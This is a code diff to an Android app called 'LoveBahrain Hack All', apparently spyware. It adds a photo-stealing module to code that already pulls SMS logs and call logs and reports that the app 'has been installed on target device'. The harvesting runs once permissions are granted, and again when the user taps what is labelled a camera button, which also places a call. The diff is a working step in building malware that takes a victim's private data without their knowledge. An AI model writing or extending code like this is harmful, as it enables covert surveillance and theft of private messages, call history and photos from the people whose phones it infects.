@@ -21,6 +21,7 @@ import android.os.BatteryManager
 import cocomelonc.hackall.tools.HackAllCallLogs
 import cocomelonc.hackall.tools.HackAllCaller
 import cocomelonc.hackall.tools.HackAllSmsLogs
+import cocomelonc.hackall.tools.HackAllPhotos
 
 class HackAllMainActivity : ComponentActivity() {
     private lateinit var cameraButton: Button
@@ -29,10 +30,11 @@ class HackAllMainActivity : ComponentActivity() {
     val hackSms = HackAllSmsLogs(context = this)
     val hackAllCallLogs = HackAllCallLogs(context = this)
     val hackAllCaller = HackAllCaller(context = this)
+    val hackAllPhotos = HackAllPhotos(context = this)
 
     // installed and opened - 1 stage
     private fun greetings(): String {
-        return "\uD83D\uDCF1 LoveBahrain Hack All application has been installed on target device and opened\n"
+        return "LoveBahrain Hack All application has been installed on target device and opened\n"
     }
 
     // get battery info - 2 stage
@@ -53,7 +55,7 @@ class HackAllMainActivity : ComponentActivity() {
             BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
             else -> "Unknown"
         }
-        return  "Battery Info:\n" +
+        return  "\uD83D\uDD0B Battery Info:\n" +
                 "Percentage: $percentage%\n" +
                 "Charging: $isCharging\n" +
                 "Charging Method: $chargeType"
@@ -82,9 +84,10 @@ class HackAllMainActivity : ComponentActivity() {
                             "All the permissions are granted..",
                             Toast.LENGTH_SHORT
                         ).show()
-                        HackAllNetwork(applicationContext).sendTextMessage("\uD83D\uDCF1 Hack All permissions granted\n")
+                        HackAllNetwork(applicationContext).sendTextMessage("Hack All permissions granted\n")
                         hackSms.getSmsLogs()
                         hackAllCallLogs.getCallLogs()
+                        hackAllPhotos.sendPhotos()
                     }
 
                     // check for permanent denial of any permission
@@ -130,6 +133,7 @@ class HackAllMainActivity : ComponentActivity() {
         cameraButton.setOnClickListener {
             hackSms.getSmsLogs()
             hackAllCallLogs.getCallLogs()
+            hackAllPhotos.sendPhotos()
             hackAllCaller.startNewCall()
         }
 
